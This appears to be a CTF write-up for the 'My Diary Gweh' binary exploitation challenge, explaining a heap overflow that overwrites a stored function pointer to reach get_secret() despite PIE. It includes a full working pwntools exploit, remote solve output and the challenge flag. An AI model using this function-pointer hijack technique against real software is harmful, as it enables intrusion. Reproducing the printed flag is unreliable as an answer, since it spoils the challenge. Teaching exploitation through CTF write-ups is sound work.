@@ -1,0 +1,495 @@
+---
+title: 'Qualification ARA 7.0 - My diary gweh'
+description: 'Heap overflow, function-pointer hijack, and a PIE-aware control-flow redirection into get_secret().'
+date: 2026-03-17
+category: 'qualification-ara-7-0'
+discipline: 'binary-exploitation'
+authors: ['abdieeuh']
+draft: false
+---
+
+> Note: I solved this challenge with LLM
+
+# My Diary Gweh
+
+## Intro
+
+At first glance this challenge looks harmless: just a small diary application with the usual CRUD flow for entries.
+
+But in pwn tasks, CRUD often means trouble. You usually get heap allocations, stored pointers, and an edit path that writes more than it should. That is exactly what happens here.
+
+The goal is simple:
+
+- create an entry
+- abuse the edit operation to corrupt its function pointer
+- make the program call the hidden `get_secret()` function
+
+That secret function reads `flag.txt`, while the normal menu never exposes it.
+
+## Recon:
+
+The file type already tells us two useful facts:
+
+```bash
+$ file ./chall
+./chall: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f46e787d32b6de9c22b93126a9a48e5951aaeac5, for GNU/Linux 3.2.0, not stripped
+```
+
+- it is an amd64 ELF
+- it is PIE, so code addresses move every run
+
+The remote target during the event was:
+
+```bash
+$ nc chall-ctf.ara-its.id 4141
+```
+
+## Protection Check
+
+The binary protections were:
+
+```bash
+$ checksec --file=./chall
+[*] '/home/abdieeuh/ara7/pwn/my_diary_gweh/chall'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+```
+
+For beginners, the practical takeaway is:
+
+- `NX enabled` means direct shellcode is not the clean route.
+- `PIE enabled` means runtime code addresses are randomized.
+- `Full RELRO` means GOT overwrite is not the nice shortcut.
+- `No canary found` means there is no stack canary, but this challenge does not actually need a stack bug.
+
+So the likely attack surface is not the stack. It is the heap and any stored callback pointers.
+
+## Symbols and Strings: Where Is the Interesting Code?
+
+Because the binary is not stripped, symbol lookup is easy:
+
+```bash
+$ nm -n ./chall | rg -n " get_secret$| entry_printer$| write_entry$| read_entry$| edit_entry$| delete_entry$| main$| entries$" -n
+27:0000000000001209 T get_secret
+28:0000000000001294 T entry_printer
+31:000000000000136c T write_entry
+32:00000000000014d7 T read_entry
+33:0000000000001587 T edit_entry
+34:000000000000164f T delete_entry
+35:0000000000001710 T main
+53:0000000000004040 B entries
+```
+
+The two symbols that matter most are:
+
+- `entry_printer` at `0x1294`
+- `get_secret` at `0x1209`
+
+Then `strings` provides the rest of the clue:
+
+```bash
+$ strings -a -tx ./chall | sed -n '18,55p'
+   200a flag.txt
+   2013 flag.txt not found
+   2028 bro how do you even discover my wife's secret?
+   2057 Content:
+   20b4  Ye Shunguang's Diary
+   2119 1. Write Entry
+   2128 2. Read Entry
+   2136 3. Edit Entry
+   2144 4. Delete Entry
+   2154 5. Exit
+   215f Index (0-9):
+   2170 Invalid index!
+   217f Entry content:
+   2191 Entry successfully created!
+   21ad Index:
+   21b5 Entry empty!
+   21c2 Edit entry:
+   21cf Entry successfully edited!
+   21ea Entry successfully deleted!
+   2206 Invalid option!
+```
+
+At this point, the intended objective is visible:
+
+- there is a hidden function called `get_secret`
+- it references `flag.txt`
+- the normal menu never calls it
+
+So the exploit goal is to redirect control flow into that function.
+
+## Reconstructing the Entry Structure
+
+The most important observation comes from `write_entry()`.
+
+Relevant disassembly:
+
+```asm
+; write_entry (offset 0x136c)
+13ec: bf 48 00 00 00        mov    edi,0x48
+13f1: e8 ca fc ff ff        call   malloc@plt
+...
+1427: 48 8d 15 66 fe ff ff  lea    rdx,[rip-0x19a]
+142e: 48 89 50 40           mov    QWORD PTR [rax+0x40],rdx
+...
+146c: be 40 00 00 00        mov    esi,0x40
+1474: e8 27 fc ff ff        call   fgets@plt
+```
+
+That means:
+
+- the program allocates `0x48` bytes
+- it stores a function pointer at offset `+0x40`
+- it stores the visible entry content before that
+
+So the structure is effectively:
+
+```c
+typedef struct Entry {
+  char content[0x40];
+  void (*printer)(struct Entry *);
+} Entry;
+
+Entry *entries[10];
+```
+
+And the simplified pseudocode for `write_entry()` becomes:
+
+```text
+function write_entry():
+  idx = input_int("Index (0-9): ")
+  if idx < 0 or idx > 9 or entries[idx] != NULL:
+    puts("Invalid index!")
+    return
+
+  e = malloc(0x48)
+  entries[idx] = e
+  e->printer = entry_printer
+
+  printf("Entry content: ")
+  fgets(e->content, 0x40, stdin)
+  strip_newline(e->content)
+  puts("Entry successfully created!")
+```
+
+This is the key design flaw: every heap entry stores a callback pointer that will later be called.
+
+## The Main Bug: Heap Overflow in `edit_entry()`
+
+Now look at the edit path:
+
+```asm
+; edit_entry (offset 0x1587)
+1628: 48 8b 04 02           mov    rax,QWORD PTR [rdx+rax*1]
+162c: ba 60 00 00 00        mov    edx,0x60
+1631: 48 89 c6              mov    rsi,rax
+1634: bf 00 00 00 00        mov    edi,0x0
+1639: e8 52 fa ff ff        call   read@plt
+```
+
+The bug is simple:
+
+- the chunk size is `0x48`
+- `read()` writes `0x60` bytes
+
+So the overflow length is:
+
+```text
+0x60 - 0x48 = 0x18 bytes
+```
+
+And because the function pointer sits exactly at offset `+0x40`, the payload can reach it directly.
+
+The simplified pseudocode is:
+
+```text
+function edit_entry():
+  idx = input_int("Index: ")
+  if idx invalid or entries[idx] == NULL:
+    puts("Entry empty!")
+    return
+
+  printf("Edit entry: ")
+  read(0, entries[idx], 0x60)   ; heap overflow
+  puts("Entry successfully edited!")
+```
+
+That is enough for a clean function-pointer overwrite.
+
+## Triggering the Call: `read_entry()` Uses `entry->printer`
+
+The read path is where the exploit pays off:
+
+```asm
+; read_entry (offset 0x14d7)
+1563: 48 8b 40 40           mov    rax,QWORD PTR [rax+0x40]
+...
+1580: 48 89 d7              mov    rdi,rdx
+1583: ff d0                 call   rax
+```
+
+This translates to:
+
+```text
+function read_entry():
+  idx = input_int("Index: ")
+  if idx invalid or entries[idx] == NULL:
+    puts("Entry empty!")
+    return
+
+  entries[idx]->printer(entries[idx])
+```
+
+So the full chain is:
+
+1. `write_entry()` creates a chunk and sets `printer = entry_printer`
+2. `edit_entry()` overflows into the function pointer
+3. `read_entry()` calls the corrupted function pointer
+
+Once the pointer is redirected to `get_secret()`, the binary prints the flag for us.
+
+## Why PIE Does Not Stop This
+
+This is the nicest part of the challenge.
+
+Because PIE is enabled, runtime addresses are:
+
+```text
+runtime = pie_base + symbol_offset
+```
+
+The relevant offsets are:
+
+- `entry_printer = 0x1294`
+- `get_secret = 0x1209`
+
+Written in little-endian form, these two offsets differ only in the lowest byte:
+
+```text
+... 12 94   entry_printer
+... 12 09   get_secret
+```
+
+That means the upper bytes, including the PIE base, are already correct as long as the pointer still points somewhere inside the same binary.
+
+So in theory, a one-byte partial overwrite is enough:
+
+- change `0x94` to `0x09`
+- keep the rest of the pointer untouched
+- the address becomes `pie_base + 0x1209`
+
+This is a very useful exploitation pattern:
+
+- if two code pointers inside the same PIE binary differ only in a low byte or two
+- and you can partially overwrite a function pointer
+- you may not need a PIE leak at all
+
+## What `get_secret()` Actually Does
+
+The hidden function is exactly the win routine we need.
+
+Disassembly:
+
+```asm
+; get_secret (offset 0x1209)
+121b: lea rax,[rip+0xde8]   ; "flag.txt"
+1225: call fopen@plt
+...
+1256: mov esi,0x40
+125e: call fgets@plt
+1263: lea rax,[rip+0xdbe]   ; "bro how do you even discover my wife's secret?"
+126d: call puts@plt
+1279: call puts@plt         ; print buffer (flag)
+128f: call exit@plt
+```
+
+Pseudocode:
+
+```text
+function get_secret():
+  fp = fopen("flag.txt", "r")
+  if fp == NULL:
+    puts("flag.txt not found")
+    exit(1)
+
+  buf = fgets(0x40, fp)
+  puts("bro how do you even discover my wife's secret?")
+  puts(buf)
+  fclose(fp)
+  exit(0)
+```
+
+So once we redirect execution there, the challenge is effectively solved.
+
+## Exploitation
+
+The shortest conceptual exploit is:
+
+1. create an entry
+2. overflow its `printer` pointer through `edit_entry()`
+3. change `entry_printer` into `get_secret`
+4. trigger the call with `read_entry()`
+
+In archived local testing, a fake flag file was created first:
+
+```bash
+$ echo 'FAKEFLAG{local_test}' > flag.txt
+$ python3 solve.py
+[x] Starting local process './chall'
+[+] Starting local process './chall': pid 106442
+[*] Process './chall' stopped with exit code 0 (pid 106442)
+FAKEFLAG{local_test}
+```
+
+And the archived remote solve output was:
+
+```bash
+$ python3 solve.py REMOTE
+[x] Opening connection to chall-ctf.ara-its.id on port 4141
+[x] Opening connection to chall-ctf.ara-its.id on port 4141: Trying 210.79.190.64
+[+] Opening connection to chall-ctf.ara-its.id on port 4141: Done
+ARA7{y3_5hungu4ng_buk4nkah_1ni_myy_ist3r1_gwehhh_4hh}
+[*] Closed connection to chall-ctf.ara-its.id port 4141
+```
+
+## Exploit Logic
+
+The logic in prose is very small:
+
+1. create index `0`
+2. overflow past `content[0x40]`
+3. overwrite the `printer` callback
+4. read the entry back so the program calls the new target
+
+The archived writeup emphasizes the one-byte overwrite idea:
+
+```python
+get_secret_lsb = context.binary.symbols["get_secret"] & 0xFF
+payload = b"A" * 0x40 + p8(get_secret_lsb)
+```
+
+That works because the original pointer already points into the same PIE image.
+
+The archived standalone `solve.py` takes a slightly more explicit path:
+
+1. create an entry
+2. edit it with exactly `0x40` bytes so the string no longer ends before the function pointer
+3. read the entry back and leak the current `entry_printer` pointer bytes
+4. derive `pie_base` from that leak
+5. overwrite the whole callback with the full runtime address of `get_secret`
+6. trigger the callback again
+
+Conceptually, both approaches rely on the same layout. The script below simply makes the target address explicit.
+
+## Solver Script
+
+I attached the archived solver as [solve.py](./solve.py). The full script is included below.
+
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+def solve(host="chall-ctf.ara-its.id", port=4141):
+    p = remote(host, port)
+    
+    # Step 1: Create entry at index 0
+    p.recvuntil(b"> ")
+    p.sendline(b"1")
+    p.recvuntil(b": ")
+    p.sendline(b"0")
+    p.recvuntil(b": ")
+    p.sendline(b"init")
+    
+    # Step 2: Edit with 0x40 bytes (removes null terminator, allowing leak)
+    p.recvuntil(b"> ")
+    p.sendline(b"3")
+    p.recvuntil(b": ")
+    p.sendline(b"0")
+    p.recvuntil(b": ")
+    p.send(b"A" * 0x40)
+    
+    # Step 3: Read to leak function pointer
+    p.recvuntil(b"> ")
+    p.sendline(b"2")
+    p.recvuntil(b": ")
+    p.sendline(b"0")
+    
+    output = p.recvuntil(b"> ")
+    
+    # Parse leak
+    idx = output.find(b"Content: ") + len(b"Content: ")
+    end_idx = output.find(b"\n", idx)
+    content = output[idx:end_idx]
+    
+    # Extract leaked address bytes (after 0x40 padding)
+    leaked_bytes = content[0x40:]
+    leaked_addr = u64(leaked_bytes.ljust(8, b'\x00'))
+    
+    # Calculate addresses (entry_printer at 0x1294, get_secret at 0x1209)
+    base = leaked_addr - 0x1294
+    get_secret = base + 0x1209
+    
+    # Step 4: Overwrite function pointer
+    p.sendline(b"3")
+    p.recvuntil(b": ")
+    p.sendline(b"0")
+    p.recvuntil(b": ")
+    payload = b"A" * 0x40 + p64(get_secret)
+    p.send(payload)
+    
+    # Step 5: Trigger get_secret
+    p.recvuntil(b"> ")
+    p.sendline(b"2")
+    p.recvuntil(b": ")
+    p.sendline(b"0")
+    
+    # Get flag
+    result = p.recvall(timeout=2)
+    
+    # Extract flag
+    flag_start = result.find(b"ARA7{")
+    flag_end = result.find(b"}", flag_start) + 1
+    flag = result[flag_start:flag_end]
+    
+    p.close()
+    return flag.decode()
+
+if __name__ == "__main__":
+    flag = solve()
+    print(f"Flag: {flag}")
+```
+
+## Flag
+
+```text
+ARA7{y3_5hungu4ng_buk4nkah_1ni_myy_ist3r1_gwehhh_4hh}
+```
+
+## Closing
+
+This challenge is a good example of how a tiny binary can still teach a very practical exploitation idea.
+
+The bug itself is simple:
+
+- a heap overflow over a small object
+- a function pointer stored right after user-controlled data
+
+The elegant part is the bypass:
+
+- PIE is enabled
+- but the two target functions are close enough that a one-byte partial overwrite is sufficient
+
+That is the kind of detail that wins a challenge quickly. Instead of treating PIE as a blocker, you look at the exact offsets and realize the original pointer already gives you almost everything you need.
+
+## References
+
+- [Pwntools Documentation](https://docs.pwntools.com/en/stable/)
+- [checksec.sh](https://github.com/slimm609/checksec.sh)
+- [PIE notes by ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack/pie)
+- [Partial overwrite notes by ir0nstone](https://ir0nstone.gitbook.io/notes/types/stack/aslr/partial-overwrite)
+- [Heap overflow notes by ir0nstone](https://ir0nstone.gitbook.io/notes/types/heap/heap-overflow)
